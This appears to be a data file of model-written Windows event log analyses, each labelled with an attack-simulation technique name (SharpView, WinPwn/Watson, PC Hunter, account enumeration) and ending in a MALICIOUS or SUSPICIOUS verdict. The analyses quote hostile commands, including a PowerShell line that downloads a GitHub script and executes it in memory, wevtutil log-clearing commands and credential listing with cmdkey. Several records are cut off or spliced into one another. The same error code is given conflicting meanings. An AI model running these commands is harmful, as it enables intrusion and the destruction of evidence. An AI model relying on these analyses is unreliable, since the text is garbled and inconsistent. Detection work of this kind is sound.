   - The execution of Microsoft Edge Update-related installers and subsequent commands appear to be part of a legitimate software update process, notably running with `NT AUTHORITY\SYSTEM` privileges.

4. **Update Activity**: Logs from Windows Update Client show the installation of a Security Intelligence Update for Microsoft Defender Antivirus. This seems like a legitimate update operation.

5. **Sysmon Logs Analysis**:
   - Detailed Sysmon logs largely show the execution of benign system processes or legitimate administrative tasks. There is no clear evidence of unusual or binary execution except for the pattern of process auditing.

6. **Security Audit Failures**: Detected logon attempts related to `MicrosoftAccount` and `WindowsLive`, which returned with error code `3221226021`. The unsuccessful attempts themselves are not inherently suspicious but could indicate reconnaissance or attempts to verify account details.

### Conclusion:
- **Most actions can be aligned with legitimate administrative tasks or software update processes**, yet there are concerning signs, such as the clearing of event logs and extensive registry querying - both of which are red flags for potential malicious behavior.

**Resolution: SUSPICIOUS**

### Recommendations:
1. **Immediate Action**:
   - Investigate the intent of the user `SERVER002\admin_test` regarding the clearing of event logs.
   - Verify if the extensive registry querying via PowerShell was part of a scheduled task, script, or user directive. Consider checking other systems for similar activity.

2. **Enhanced Monitoring**:
   - Implement stricter monitoring and alerting on event log clearing.
   - Increase logging and alerting on administrative actions performed over PowerShell, especially involving registry and log operations.

3. **Review and Audit**:
   - Conduct a full security audit of the server `SERVER002`.
   - Validate the integrity of user accounts and privileges on the server; ensure proper segregation of duties.

Further investigation is warranted to confirm whether the suspicious activities are benign or part of a malicious attempt."
System Information Discovery,"Upon analyzing the provided Windows event logs, the following observations are made regarding suspicious or potentially malicious activities:

1. **Usage of `wevtutil.exe` for Log Clearing:**
   - Multiple instances of `wevtutil.exe` are being launched with the command `cl` followed by different log names, such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `""Windows PowerShell""`. This command is used to clear events logs. 
   - Events recorded in the System and Security logs confirm that the logs were indeed cleared (Event ID 104 and 1102, respectively). Clearing event logs is an action often taken by malicious actors to cover tracks.

2. **High Integrity Level:**
   - The processes are running with high integrity levels, indicating high privileges, which should be scrutinized, especially when coupled with actions to clear event logs.

3. **Processes Originating from NT AUTHORITY:**
   - Several entries show processes associated with updating Microsoft Edge under the user `NT AUTHORITY\SYSTEM`, which is normal for software updates. However, they are not related to the immediate suspicion around log clearing.

4. **Use of Standard Utilities:**
   - The logs list the execution of common utilities such as `hostname.exe`, `whoami.exe`, `cmd.exe`, `systeminfo.exe`, and `reg.exe`. While these can be used for benign administrative tasks or system diagnostics, the usage context—particularly around the execution of commands querying sensitive registry paths in combination with a cleared log—can suggest reconnaissance activity or preparatory steps for exploitation.

5. **Time Manipulation:**
   - The logs show evidence of time manipulation (Event IDs 4616) where the system time was altered. Adjusting system time is a tactic sometimes employed to hinder forensic analysis.

Given these findings, the activities logged give strong indications of potential malicious actions, specifically the clearing of event logs to obscure operational activities on the system. The actions recorded in the logs suggest deliberate attempts to erase footprints, which is a common practice in compromise scenarios.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Containment:**
   - Isolate the host `Server002` from the network to prevent further unauthorized activities and potential lateral movement.

2. **Forensic Duplication:**
   - Acquire a comprehensive forensic image of the compromised system for further analysis and save any volatile data to assess all ongoing processes and established connections.

3. **Investigation:**
   - Conduct an in-depth forensic analysis to identify how the compromise occurred, establish root cause, and any potential data exfiltration that may have taken place.

4. **System Remediation:**
   - Inspect and validate integrity across all accounts and access privileges on the system, especially those associated with `admin_test`.
   - Review and reinforce security controls, including audit and review of privileged account activities.
   
5. **Monitoring and Alerts:**
   - Enhance logging and alerting mechanisms for future detection of similar suspicious activities.

6. **Patch and Update:**
   - Ensure that the system and all software are up to date with the latest security patches to protect against known vulnerabilities.

Taking these actions will help respond to the incident effectively, mitigate current threats, and improve the system's security posture against future attacks."
Simulating MAZE Directory Enumeration,"### Analysis of Windows Event Logs

---

#### **1. Windows PowerShell Log:**

The PowerShell script observed in the logs appears suspicious. The script gathers information from user directories, program files, and writes it to a temporary text file (`T1083Test5.txt`). The enumeration of directories such as `Desktop`, `Downloads`, `Documents`, `AppData/Local`, and `AppData/Roaming` indicates potential reconnaissance activity, possibly aligned with the MITRE ATT&CK technique T1083 (File and Directory Discovery).

#### **2. Security Log:**

A log clearing event is observed (Event ID 1102) where the logs on the host were cleared by a user (`admin_test`). This is typically considered suspicious or even malicious, as threat actors may use this tactic to cover their tracks. The presence of log entries with time adjustments (Event ID 4616) could indicate time-stomping, a technique used to hide unauthorized actions.

#### **3. Application Log:**

The presence of EdgeUpdate entries showing service start and stop events are seen, but do not directly indicate malicious activity without further context.

#### **4. System Log:**

The system log also shows evidence of log files being cleared (Event ID 104) by the user `admin_test`, including the Security and PowerShell logs, which is a strong indicator of potential abuse or cover-up actions.

#### **5. Sysmon Log:**

Repeated execution of `wevtutil.exe` to clear logs (`cl` command for Application, System, and Security channels) confirms that an administrative user attempted to clear Windows Event Logs (Event ID 104). This is typically indicative of malicious intent.

Also, the execution of various utilities like `hostname.exe` and `whoami.exe`, while relatively benign by themselves, can be part of an attacker's information gathering phase.

Additionally, PowerShell utilization tied to the suspicious script execution recorded in the PowerShell logs appears, corroborating the execution of potentially malicious scripts on the host.

### **Assessment**

Based on the evidence provided in the logs:

- The use of PowerShell scripts for directory enumeration suggests reconnaissance activity.
- Clearing of event logs by the user `admin_test` is highly suspicious and indicative of an attempt to hide malicious actions.
- The sequence of events reveals potential malicious behavior aimed at data discovery and subsequent artifact cleanup to avoid detection.

### **Resolution**

**MALICIOUS** - Given the observed script, enumeration activity, usage of `wevtutil` to clear critical log data, and the covering up of tracks, the indicators strongly suggest a malicious activity pattern.

### **Guidance on How to Proceed**

1. **Immediate Incident Response:**
   - Quarantine the affected system to prevent further action by the potential attacker.
   - Perform a full forensic analysis to determine the scope and method of attack.

2. **Review User Access:**
   - Investigate the user account `admin_test` to determine if it's compromised.
   - Check Active Directory logs for any suspicious activities or lateral movements.

3. **Increase Monitoring:**
   - Implement additional logging and alerting on PowerShell usage and log-clearing events.
   - Monitor similar activity patterns across other systems within the network.

4. **Mitigation Actions:**
   - Evaluate security configurations for user access and PowerShell execution policies.
   - Consider enhancing security tooling with Endpoint Detection and Response (EDR) solutions.

5. **Review Security Policies:**
   - Conduct a security review to ensure broader compliance with best practices, such as least privilege and secure audit trail retention. 

This case reflects typical post-compromise activity where an attacker seeks to persist and remain undercover within a networked environment."
System Service Discovery,"### Detailed Analysis of Provided Windows Event Logs

#### Overview
The logs provided from the Windows host ""Server002"" show activities across multiple channels: System, Security, Sysmon, and to some extent, Windows Update. During the analysis, we have identified some indicators that point towards potentially suspicious activity. Below is a detailed breakdown:

#### System Log Analysis
1. **Event ID 104 - Log File Cleared**
   - The `wevtutil.exe` command has been executed by `SERVER002\admin_test` to clear multiple event logs (System, Windows PowerShell).
   - Log clearing is a suspicious activity, often linked with an attempt to cover tracks after a malicious action.

2. **Event ID 44/43 - Windows Update Client**
   - Regular Windows Defender Antivirus updates, no immediate signs of malicious activity from these entries.

#### Security Log Analysis
1. **Event ID 1102 (Audit log cleared)**
   - Similar to the System Log, this indicates security logs were cleared, which once again points to suspicious activity.

2. **Event ID 5379 – Credential Validation**
   - Multiple entries showing failed credential validation attempts for the user ""MicrosoftAccount:user=02txoixylodcstop"". 
   - ReturnCode `3221226021` indicates STATUS_NO_MEMORY or STATUS_ACCESS_DENIED, which could be an indicator of unsuccessful password attempts or unauthorized access attempts.

#### Sysmon Log Analysis
1. **Process Execution with Event ID 1**
   - Multiple executions of `wevtutil.exe` with the intention to clear logs:
     - Commands executed like `wevtutil.exe cl <LogName>` where `<LogName>` represents different log sections such as `System`, `Security`, and `Application`.
   - The use of `cmd.exe` with command lines running `tasklist.exe` and `sc query` is potentially trying to enumerate running tasks or services. Combined with the event log clear commands, these are red flags often associated with privilege escalation or lateral movement phases in cyber attacks.

2. **Multiple executions of utilities like `whoami.exe`, `hostname.exe`, `sc.exe`**
   - These are typical system commands, but their sequence of execution together with log clearing and task/service enumeration points towards reconnaissance activities.

#### Indicators of Compromise
- **Log Clearing:** Both system and security logs have been deliberately cleared, which is one of the major tactics used in malicious activities to hide traces.
- **Unauthorized Commands:** Usage of Wevtutil and Cmd in the specified manner aligns with unauthorized access activities to avoid detection.
- **Credentials Access Failures:** Repeated failed logons or access attempts without known context might indicate an account compromise attempt.

### Conclusion
Given the analysis above, the logs provided are classified as **MALICIOUS**. There are strong indicators of potentially unauthorized activities including log clearance, usage of system utilities with suspicious command lines, and failed credential attempts.

### Guidance on How to Proceed
1. **Immediate Actions:**
   - Disconnect the affected system from the network to prevent further exploitation.
   - Perform a full antivirus scan and investigate any malicious processes or files.

2. **Further Investigations:**
   - Check the current account details of `SERVER002\admin_test` for any unauthorized changes or activities.
   - Inspect network logs to identify any anomalies in data flows or connections that coincide with the log timings.
   - Conduct a detailed forensic analysis on system logs that were cleared to reconstruct possible sequences of actions taken by the potential attacker.

3. **Long-term Measures:**
   - Strengthen log monitoring and alert mechanisms for critical system actions like log clearing and process executions.
   - Consider implementing stricter access controls and multi-factor authentication for administrative accounts.
   - Review and update incident response and recovery protocols to mitigate future occurrences."
Get-EventLog To Enumerate Windows Security Log,"Based on the logs provided, here's a detailed analysis with a focus on identifying any indicators of malicious activity:

1. **Event Log Clearing:**
   - The logs indicate events clearing the Windows event logs, specifically event IDs 1102 (Security log cleared), and 104 (System log cleared). The user 'admin_test' executed these actions. Clearing event logs is often associated with attempts to cover tracks and can be a concerning indicator of potentially malicious activity.

2. **Process Execution and Command Line Activity:**
   - The `wevtutil` command was used multiple times to clear various Windows logs ('Microsoft-Windows-Sysmon/Operational', 'Application', 'Security', and 'Windows PowerShell'). This is significant as it correlates with the log-clearing events outlined above and suggests an attempt to remove traces of log evidence.
   - Powershell commands observed include one that extracts Windows event log data into a CSV file. The specific command used was `powershell.exe & {powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\T1654_events.txt}}`. The use of encoded PowerShell commands and querying of Security logs is also indicative of suspicious behavior, particularly if run without clear justification.

3. **Security Log Events (Event IDs 4624 and 4672):**
   - Multiple logon events (ID 4624) with elevations of privileges (ID 4672) were registered for the 'SYSTEM' user, which reflects activity performed with administrative privileges. While SYSTEM logons can be legitimate, they can also indicate abuse if seen in conjunction with attempts to hide activities (e.g., clearing logs).

4. **Service and Process Execution:**
   - Various legitimate system services (e.g., `taskhostw.exe`, `DeviceCensus.exe`) were started. However, the presence of these non-suspicious services does not negate the malicious-looking activity related to event log manipulation and PowerShell script execution.

5. **Network and Credential Access Operations:**
   - Several credential-related events (ID 5379), primarily resulting in failure (`ReturnCode: 3221226021` indicates STATUS_OBJECT_NAME_NOT_FOUND), were logged, but these do not readily indicate a compromise without further context.

6. **System and Application Events:**
   - Normal Windows operations and service startups are noted, such as software protection events and benign Windows Update routines. However, a Security Center notice indicating 'Windows Defender, SECURITY_PRODUCT_STATE_ON' suggests no intervening security changes.

**Assessment and Resolution:**
- The combination of event log clearance, execution of potentially obfuscating PowerShell scripts, and frequent privilege elevation is indicative of distinct attempts to perform malicious activities stealthily.
  
**Final Resolution: MALICIOUS**
- The actions observed in the logs imply deliberate attempts to purge records of activity, a known tactic to cover up unauthorized actions, potentially after a cyber intrusion or compromise. Immediate investigation into user `admin_test` activities and a thorough security audit of Server002 are advised."
Enumerate all accounts via PowerShell (Local),"Based on the analysis of the provided logs, there are multiple indicators that suggest potentially suspicious or malicious activity:

1. **Log Clearing Events**: 
   - The system, security, and PowerShell logs were cleared by the user account `admin_test`. This action often signifies an attempt to cover up malicious activity by erasing evidence. Event IDs 104, 1102, and accompanying Sysmon events show log clearing via the `wevtutil.exe` utility.

2. **PowerShell Script Execution**:
   - In the Sysmon logs, there are entries indicating the execution of PowerShell with commands such as `net user`, `get-localuser`, `get-localgroupmember`, `cmdkey.exe /list`, and directory listing of `C:\Users\`. This pattern of commands is indicative of reconnaissance activity performed by an attacker to gather information about user accounts and credentials.

3. **Suspicious Process Activity**:
   - The frequent execution of `wevtutil.exe` for clearing logs, `net.exe`, and `cmdkey.exe` combined with reconnaissance commands is suspicious in the context of potential lateral movement or privilege escalation by an attacker.
   - Another notable process is the `svchost.exe` events between time changes, which might indicate time manipulation, a technique sometimes used to disrupt logs and monitoring processes.

4. **Unusual Command Lines**:
   - The repetitive use of `whoami.exe`, which is typically used to confirm user identity after potentially altering it or confirming the current access level, can suggest attempts to verify elevated privileges.

5. **Repeated PowerShell Engine State Changes**:
   - The `Windows PowerShell` logs show transitions indicating script activity, which is consistent with the observed shell commands in Sysmon logs.

### Summary and Resolution:
The actions of log clearing, PowerShell script execution with reconnaissance commands, and use of `cmdkey.exe` to list network stored credentials, indicate suspicious behavior consistent with attack methodologies such as privilege escalation and lateral movement. Given the deliberate nature and indications of potential malicious intent:

**Resolution: MALICIOUS**

### Guidance:
1. Immediately isolate the machine from the network to prevent further potential lateral movement or data exfiltration.
2. Begin a thorough forensic investigation to determine the extent of the compromise, assessing any stored or transmitted data for further signs of infiltration or exfiltration.

Azure - Dump Subscription Data with MicroBurst,"Upon examining the provided Windows event logs, several patterns and clues suggest that potentially malicious activities have taken place. Here's a detailed analysis:

1. **Log Cleansing Activity:**
   - Multiple instances of `wevtutil.exe` used to clear event logs, particularly the Security (Event ID: 1102), System, and Windows PowerShell channels are observed. These actions were executed by the user ""admin_test"".
   - Events in the Sysmon log corroborate `wevtutil.exe` usage from the ""admin_test"" account to clear logs (Sysmon Event ID: 1 for process creation and Event ID: 5 for process termination).

2. **Suspicious PowerShell Usage:**
   - Instances of PowerShell execution with unconventional and obfuscated command lines were noted, where sensitive operations like importing modules are done from temporary directories using Base64 encoded content.
   - The `PowerShell` log entries and Sysmon capture potential execution of scripts (Atomic Red Team) with credential handling functions, hinting at potential credential access or privilege escalation attempts.

3. **Indicators of Lateral Movement or Reconnaissance:**
   - Commands related to obtaining domain information are seen, which may indicate reconnaissance efforts within a network.
   - The use of `whoami.exe` and `hostname.exe` by ""admin_test"" can denote system enumeration activities.

4. **Process and Privilege Escalation Observations:**
   - Numerous instances of `CompatTelRunner.exe` and `svchost.exe` activities are seen. While these can be part of legitimate operations, their timing aligns closely with other suspicious activities.
   - Elevated privileges and logon sessions tied to ""admin_test"" and SYSTEM are notable.

5. **Multiple High-Integrity Process Executions:**
   - Several processes were executed with high integrity levels, including PowerShell and event log-clearing utilities, under suspicious user contexts.

**Assessment and Conclusion:**
- **MALICIOUS**: The logs indicate malicious intent, particularly through log cleansing operations, suspicious command executions, and potential reconnaissance activities. The `admin_test` user account is central to these actions and requires immediate investigation.  
- **Guidance:**
   - Investigate the ""admin_test"" account and any related accounts for unauthorized access or privilege escalation.
   - Inspect network traffic for unusual PowerShell usage and data exfiltration indicators.
   - Reinforce log management and auditing policies and re-enable event logging for cleared channels.

Enumerate logged on users via CMD (Domain),"### Log Analysis

Upon review of the logs, several key points stand out which warrant closer examination:

1. **Event Log Clearing**:
   - In the system log, there are several Event ID 104 entries indicating the clearing of event logs (System, Windows PowerShell) by the user `admin_test`. 
   - In the security log, Event ID 1102 indicates that the security event log was cleared by the same user.
   - The use of the `wevtutil cl` command is confirmed by multiple Sysmon Event ID 1 entries. This command clears event logs and is often used by attackers to cover their tracks.

2. **Suspicious Command Execution**:
   - The `wevtutil.exe` and `conhost.exe` pairings in the Sysmon logs suggest command executions consistent with the clearing of logs.
   - Multiple instances of `conhost.exe` with the `-ForceV1` flag is indicative of console sessions, likely used in conjunction with PowerShell commands or other command-line utilities. This behavior can be overlooked if expected administratively but is suspicious given the context.

3. **Time Change Events**:
   - Event ID 4616 in the security log indicates a system time change, which is another method attackers might use to confuse timelines or avoid detection of anomalous activities.
   - However, this may occur during legitimate maintenance or by time synchronization services, but within the context of log cleaning and suspicious activity raises concern.

4. **Microsoft Edge Update**:
   - Multiple executions related to Microsoft Edge Update were observed in the Sysmon logs. These are legitimate processes but in a compromised environment, malware can disguise itself under legitimate process names. The observed activities seem reasonably spaced and aligned with expected behavior, indicating scheduled update checks or updates.

5. **Unexpected `cmd.exe` Execution**:
   - A command execution involving `cmd.exe /c query user /SERVER:%COMPUTERNAME%` appears in the Sysmon logs. While this command is not inherently malicious, it could indicate an attempt to gather user information on the machine—a technique used by adversaries.

### Assessment

Given the above observations, the logs indicate activities that suggest potential deliberate actions to cover tracks by clearing logs, manipulate timestamps, and potentially gather user data. The combination of these actions creates a red flag situation even though some activities involve legitimate processes.

### Conclusion

**Resolution: SUSPICIOUS**

The actions of log clearing, time manipulation, and potential user data gathering align with typical post-exploitation techniques seen in intrusion scenarios. Further investigation is warranted to ascertain the context and intentions behind these actions. It is crucial to perform a thorough forensic analysis, verify user actions, and potentially review access logs and further behavior beyond the provided logs. Additionally, checking for unauthorized persistence mechanisms or configuration changes should be considered."

2. **Event Log Clearing**:
   - Logs from the System, Security, and Windows PowerShell channels were cleared as indicated by event 104 in the System logs. This activity is often associated with attempts to cover tracks after potentially malicious activities.

3. **Execution of Administrative Tools**:
   - There are multiple executions of `wevtutil.exe`, an event log utility often used to clear or manipulate event logs, suggestive of potentially malicious intent.

4. **Sysmon Logs**:
   - Displays the sequential execution of utilities like `whoami.exe` and `hostname.exe`, but more notably, repeated usage of `wevtutil.exe` with `cl` (clear) command to clear various logs.
   
5. **Security Logs**:
   - Privileged Windows auditing events (Event ID 4672, 4624) were recorded, showing the assignment of special privileges, including `SeDebugPrivilege` among others, to the user `admin_test`. These privileges are potentially dangerous if misused.

### Indicators of Malicious Activity
- The clearing of event logs by a non-standard process or user (`admin_test`) is strongly suggestive of malicious behavior.
- The use of the `wevtutil.exe` tool to clear logs further supports this suspicion.
- The user account `admin_test` seemed to have a significant level of access and was utilized to perform potentially obfuscating activities.
- Privilege escalation indicated by special privileges assignment to `admin_test`.

### Conclusion and Resolution

After analyzing the log entries:
- The PowerShell activity alone may not be suspicious, but combined with the log clearing behavior, it could suggest a setup for malicious actions.
- The consistent use of `wevtutil.exe` to clear logs, and the clearing of multiple log channels, is indicative of attempts to hide activity on the system.
- Logon activities and privilege assignments support potentially unauthorized or harmful actions.

**Resolution: MALICIOUS**

### Recommendations

   - There are multiple events (EventID 4672) showing `admin_test` obtaining privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. These privileges allow powerful operations, hence warranting further investigation into whether this was expected behavior.

3. **Command Execution:**
   - Commands such as `net accounts /domain` were executed. While not inherently malicious, these commands can be used for reconnaissance by attackers to gather information about user account policies.

4. **Process Activity:**
   - Use of `wevtutil.exe` to clear logs and subsequent commands executed by high-integrity level processes. This behavior is suspect given the context of log clearing.
   - Multiple instances of `cmd.exe`, `net.exe`, and `whoami.exe` being executed in quick succession can be indicative of manual or automated investigation processes, often seen in post-exploitation scenarios.

5. **Time Synchronization:**
   - Log events involving time changes could be routine but is also worth investigating if these time alterations were unauthorized, as they can obscure the timeline of activities.

### **Assessment:**

- The combination of log clearing, elevated privileges, and command executions are strong indicators of potential malicious activity. These activities, if unauthorized, could point to an attacker trying to maintain persistence, escalate privileges, or cover their activities.

### **Resolution:**

- **Resolution: MALICIOUS**

### **Guidance on How to Proceed:**

1. **Immediate Containment:**
   - Isolate the affected system (Server002) from the network to prevent further activities and lateral movement by the attacker.
   
2. **Detailed Review:**
   - Conduct a thorough investigation to determine how `admin_test` account was compromised. Review the account activities, access logs, and reasons for logon events.
   
3. **Log Recovery:**
   - Attempt to recover cleared logs from backups, if available, to reconstruct the sequence of actions and identify initial access vectors.
   
4. **Review Privileges:**
   - Audit and restrict administrative privileges and ensure privileged accounts are monitored.

5. **Forensic Analysis:**
   - Undertake a detailed forensic analysis of the system to identify any malicious payloads or backdoors installed.

6. **Strengthen Security Posture:**
   - Implement enhanced logging and monitoring. Ensure log forwarding to a secure centralized location that is harder to tamper with.

Use of SecEdit.exe to export the local security policy (including the password policy),"### Analysis:

1. **Event Clearing:**
   - Multiple event logs (System, Security, and Windows PowerShell) are being cleared by the user `SERVER002\admin_test`. Specific logs clearing processes (`wevtutil cl` commands) are indicative of an attempt to cover tracks and are often associated with malicious activity. This behavior stands out as a potential indicator of compromise.

2. **Processes and Cmd Execution:**
   - There are executions of `whoami.exe`, `hostname.exe`, and `cmd.exe` from `SERVER002\admin_test`. Even though these are legitimate Windows utilities, their execution in conjunction with cleaning logs raises suspicion, especially since a command was run to export security policies using `secedit.exe`.
   - Additional execution of `wevtutil.exe` to clear logs like Application, Security, etc. reaffirms the attempt to conceal actions.

3. **Edge Update Execution:**
   - Numerous entries involve `MicrosoftEdgeUpdate.exe`, which is legitimate; however, their sheer frequency could be masking something suspicious or could simply be due to an update process. The entries do not, on their own, indicate suspicion without additional context of abnormal behavior or file changes.

4. **Privilege Context:**
   - The actions of `SERVER002\admin_test` suggest usage of elevated privileges, as seen from the context of NT AUTHORITY\SYSTEM in various process executions.

5. **User Behavior Analysis:**
   - The user `admin_test` is heavily engaged in executing utilities and scripts that manipulate system state, potentially to aid in reconnaissance or to apply unauthorized changes (like policy exports).

6. **Timing and Coordination:**
   - The execution of these suspicious commands and log clearing activities occur within seconds of each other, which suggests a coordinated and potentially automated script execution.

### Conclusion:

Based on the observed behaviors, particularly the clearing of event logs and the usage of administrative tools under suspicious contexts, it becomes evident that the activities align with techniques employed in compromise scenarios aiming to evade detection.

**Resolution: MALICIOUS**

### Recommended Actions:

1. **Immediate Containment:**
   - Isolate the affected machine (`Server002`) from the network to prevent further potential lateral movement and information leakage.

2. **Investigation and Forensics:**
   - Conduct a deeper forensic analysis to identify any additional malicious artifacts or persistence mechanisms installed on the machine.
   - Review user activity for `admin_test` to understand the scope of potential compromise or misuse of the account.

   - Increase logging around the `admin_test` account and relevant security systems.
   - Implement file integrity monitoring for changes in critical system files.

4. **Security Policies:**
   - Review and potentially enhance security policies around log management to prevent unauthorized clearing of logs.
   - Consider role-based access and least privilege strategies for critical accounts like `admin_test`.

5. **Awareness and Training:**
   - Train users and administrators on identifying suspicious activities and how to securely handle administrative tasks in a secure manner."
System Discovery using SharpView,"Upon reviewing the provided logs, here is the detailed analysis:

1. **Sysmon Log Analysis:**
   - Multiple occurrences of the `wevtutil.exe` utility execution with the command `cl` to clear different event logs such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", and ""Security"" channels are recorded. This is done under the user `SERVER002\admin_test`. This action is usually linked to activities attempting to cover tracks after malicious activities were carried out.

   - A specific PowerShell command was executed by `SERVER002\admin_test` that utilized the SharpView tool for actions like ""Invoke-ACLScanner"", ""Invoke-Kerberoast"", and ""Find-DomainShare"" which are typical of reconnaissance activities in penetration testing or malicious assessments.

2. **System Log Analysis:**
   - The events confirm multiple log clearances (Event ID 104) on the System and Windows PowerShell channels, performed by the user `admin_test`.

3. **Application Log Analysis:**
   - No explicit signs of malicious activity in these logs, primarily updates on Windows Defender being active.

4. **Security Log Analysis:**
   - Event ID 1102 indicates that the Security Event Log was cleared, an action often undertaken by threat actors to remove evidence of their activities.
   - Specifically, under the user `admin_test`, multiple security logs were cleared.
   - There are indications of various credential related events (Event ID 5379) which could suggest attempted credential theft or misuse activities.

5. **Windows PowerShell Log Analysis:**
   - Shows a structured execution of potentially malicious PowerShell scripts involving tools known for security research and exploitation.

**Assessment:**
- **Indicators of Malicious Activity Detected:**
  - The combination of security log clearance, execution of potentially malicious PowerShell commands for reconnaissance, and the use of `wevtutil.exe` to clear critical logs are strong indicators of malicious intent.

**Resolution:**
- **MALICIOUS**: The logs contain undeniable evidence of malicious activity, particularly efforts to conduct reconnaissance, capture credentials using potential attack simulation tools, and attempts to cover tracks by clearing event logs. 

**Guidance on How to Proceed:**
1. **Immediate Incident Response:**
   - Isolate the affected host from the network to prevent further damage or lateral movement.
   - Begin a full forensic review of the compromised system and capture memory and disk images for further analysis.

Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,"Upon examining the provided Windows event logs, several activities stand out that require attention:

1. **Clearing of Event Logs**:
   - **System Log Event ID 104** and **Security Log Event ID 1102** indicate the clearing of event logs by the user `admin_test` on the system. This is often considered suspicious because attackers frequently clear logs to cover their tracks.

2. **Use of `wevtutil.exe`**:
   - In the Sysmon logs, there are multiple instances of `wevtutil.exe` being run by `admin_test`. The command-line parameters used (`cl System`, `cl Application`, `cl Security`, `cl ""Windows PowerShell""`) indicate that the utility is being used to clear logs for the respective channels. This aligns with malicious behavior associated with attempts to hide malicious activity after its execution.

3. **Command-Line Activity with PowerShell**:
   - There are command-line invocations of PowerShell to query antivirus status using `Get-CimInstance` and `Get-WmiObject`. These commands, while not inherently malicious, could be used in reconnaissance activities to gather information about the defender's security posture.

4. **Execution of `cmd.exe` with PowerShell Commands**:
   - The command `cmd.exe /c powershell Get-CimInstance...` executed by `admin_test` suggests a more complex command pipeline that may be used for executing a series of PowerShell commands. Using `cmd.exe` as a wrapper for PowerShell commands can be a technique to bypass certain security controls or obfuscate intentions.

5. **Miscellaneous System Activity**:
   - Multiple EdgeUpdate executable activities are normal and aligned with legitimate routine background updates of Microsoft Edge.

Based on these observations, particularly the efforts to clear various event logs and use of `wevtutil.exe`, the findings are indicative of potential malicious activity or attempted cover-up actions post-intrusion. The combination of events forms a narrative consistent with post-exploitation tactics.

**Resolution**: MALICIOUS - The activity captured in the logs displays clear signs of a potential compromise, especially due to log clearing, which is a strong indication of attempts to hide malicious actions. Immediate incident response measures should be enacted, including further forensic investigation, containment, eradication, and recovery steps. Additionally, reviewing user activity for `admin_test`, verifying the integrity of system files, and rechecking security configurations and patches is recommended."
WinPwn - PowerSharpPack - Watson searching for missing windows patches,"### Analysis of the Windows Event Logs

#### Application Log
1. **Security Product State Events**:
   - The logs show consistent entries of Windows Defender being enabled (EVENT ID: 15). There are no apparent indications of tampering or disabling of security services.

2. **Software Protection Service Events**:
   - An entry related to the Software Protection Platform Service (EVENT ID: 16384) is noted, which is routine for activation and licensing-related events.

#### Windows PowerShell Log
- The log entries indicate the execution of a PowerShell command via `powershell.exe` that utilizes `iex(new-object net.webclient).downloadstring(...)` to download and execute a script from GitHub (https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1). This execution method is commonly associated with **malicious activity**, often seen in PowerShell-based fileless malware where scripts are downloaded and executed in memory.

#### Sysmon Log
1. **Process Creation Events**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are observed. While these are legitimate processes, their frequent invocation in conjunction with the PowerShell command indicates activity common in **log clearance** operations.
   - Particularly, `wevtutil.exe` usage with the `cl` (clear) command suggests a possible attempt to cover tracks by clearing event logs (Application, System, and Security).

#### Security Log
- A Security log clearance event is captured (EVENT ID: 1102) by the user `admin_test`, further substantiating the attempt to hide activities post-compromise.

#### System Log
- Log clearance events (EVENT ID: 104) for both the System and Windows PowerShell channels indicate that critical logs are being purged, which is anomalous activity often associated with **unauthorized or malicious actions**.

### Assessment

Given the analysis, the combination of PowerShell script execution from an external source and subsequent log clearing operations strongly suggests unauthorized and potentially malicious activity. The clearing of event logs is a significant indicator of efforts to eliminate traces of malicious actions.

### Recommendation

- **Resolution**: **MALICIOUS**
  
- Immediate actions should include:
  - Isolate the affected host (Server002) from the network to prevent lateral movement.
  - Conduct a comprehensive forensic investigation to identify and analyze any further malicious payloads or persistence mechanisms deployed by the script.
  - Review AD logs and network traffic for any signs of lateral movement or further compromise.
  - Reset credentials for the user account `admin_test` and any other potentially affected accounts.
  - Ensure that all systems are patched and security solutions are properly configured and updated to detect similar threats in the future.

This situation necessitates a thorough investigation with possible escalation to incident response teams to remediate any potential breaches and prevent further damage."
Process Discovery - PC Hunter,"Based on the analysis of the provided Windows event logs, here are the key findings and assessment:

1. **Event Log Clearing (Security Event 1102)**:
   - The logs show that the event logs (Security, System, and Windows PowerShell) were cleared by the user ""admin_test"". This is indicated by the Security Event ID 1102. Clearing of logs can be a red flag, especially if done by an unauthorized user, as it may suggest an attempt to erase traces of activity, potentially malicious.
   
2. **User Privileges (Security Event 4672)**:
   - The user ""admin_test"" was granted special privileges including ""SeDebugPrivilege"". This privilege is often leveraged in privilege escalation attacks, allowing processes to attach to or manipulate processes of other users, a capability unnecessary for typical login activities.
   
3. **Logon Events (Security Event 4624 and 4634)**:
   - There are multiple logon events for ""admin_test"" using NTLM authentication from workstation ""DESKTOP-3HL5B2P"". Logon Type 3 indicates network logon. Frequent logons and logoffs in quick succession can be indicative of automated behavior or scripting, which warrants further investigation.

4. **PowerShell Activity**:
   - Multiple PowerShell events (600) indicating the execution of `powershell.exe` to start another process, specifically `C:\\Temp\\ExternalPayloads\\PCHunter_free\\PChunter64.exe`. This executable, named ""PCHunter"", could be a legitimate tool, but its execution in this manner (from a potentially suspicious directory) should prompt further scrutiny to verify if it's being used for unauthorized purposes.

5. **Wevtutil Usage**:
   - Sysmon logs show execution of `wevtutil.exe` used to clear event logs via command line. This aligns with the event log clearing observations and is a known tactic to evade detection by security monitoring solutions.

6. **Unusual Command Execution**:
   - Execution of commands like `whoami.exe` and `HOSTNAME.EXE` were observed. While these could be benign, when combined with the other suspicious activities, they suggest reconnaissance or diagnostic tasks possibly performed by an intruder.

Given these findings, the situation points towards potentially malicious behavior. The clearing of event logs, special privileges used by the account, execution of potentially unwanted or unknown tools, and unusual patterns of network logon/logout suggest unauthorized or malicious activity.

**Resolution: MALICIOUS**

**Guidance for Further Action**:
- Conduct a full security audit of the account ""admin_test"", including password reset and review of access permissions.
- Investigate the origin of the logon attempts and the tool ""PCHunter_free"" to ascertain its legitimacy.
- Enhance logging and monitoring to detect further malicious activities.
- Consider using threat intelligence to check for known indicators of compromise related to these activities.
- Isolate the affected machine and conduct a forensic investigation to identify any changes made and remove any unauthorized tools or accounts."
Discover System Language with chcp,"Upon reviewing the provided Windows event logs, a few key observations can be made:

